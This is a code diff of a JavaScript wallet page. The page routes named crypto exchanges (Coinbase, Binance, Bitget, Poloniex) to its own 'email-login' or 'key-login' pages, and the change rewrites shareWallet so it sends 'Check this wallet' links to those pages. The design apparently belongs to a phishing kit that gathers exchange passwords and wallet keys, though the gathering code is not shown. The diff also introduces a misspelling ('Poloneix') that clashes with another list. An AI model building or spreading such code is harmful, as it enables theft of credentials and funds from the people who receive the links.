@@ -2,7 +2,7 @@ console.log("Wallets page loaded!");
 
 // 🔥 1) Email/Password Wallets List
 const emailWallets = [
-  "Poloniex",
+  "Poloneix",
   "Coinbase1",
   "Coinbase2",
   "Binance",
@@ -191,7 +191,7 @@ function installWallet(walletName) {
 // ==========================
 
 function openWallet(walletName) {
-  const emailWallets = ["Coinbase1", "Coinbase2", "Binance", "Bitget"];
+  const emailWallets = ["Coinbase1", "Coinbase2", "Binance", "Bitget", "Poloniex"];
 
   if (emailWallets.includes(walletName)) {
     window.location.href = `email-login.html?wallet=${encodeURIComponent(
@@ -209,20 +209,39 @@ function openWallet(walletName) {
 // ==========================
 
 function shareWallet(walletName) {
-  const shareUrl =
-    `${window.location.origin}/wallet-page.html?wallet=` +
-    encodeURIComponent(walletName);
+  const keyloginWallets = ["Poloniex","Coinbase1", "Coinbase2", "Binance", "Bitget"];
+  if (keyloginWallets.includes(walletName)) {
+    const shareUrl =
+      `${window.location.origin}/email-login.html?wallet=` +
+      encodeURIComponent(walletName);
 
-  if (navigator.share) {
-    navigator
-      .share({
-        title: "Wallet",
-        text: `Check this wallet: ${walletName}`,
-        url: shareUrl,
-      })
-      .catch(() => {});
+    if (navigator.share) {
+      navigator
+        .share({
+          title: "Wallet",
+          text: `Check this wallet: ${walletName}`,
+          url: shareUrl,
+        })
+        .catch(() => {});
+    } else {
+      alert("Sharing not supported.");
+    }
   } else {
-    alert("Sharing not supported.");
+    const shareUrl =
+      `${window.location.origin}/key-login.html?wallet=` +
+      encodeURIComponent(walletName);
+
+    if (navigator.share) {
+      navigator
+        .share({
+          title: "Wallet",
+          text: `Check this wallet: ${walletName}`,
+          url: shareUrl,
+        })
+        .catch(() => {});
+    } else {
+      alert("Sharing not supported.");
+    }
   }
 }
 // ==========================
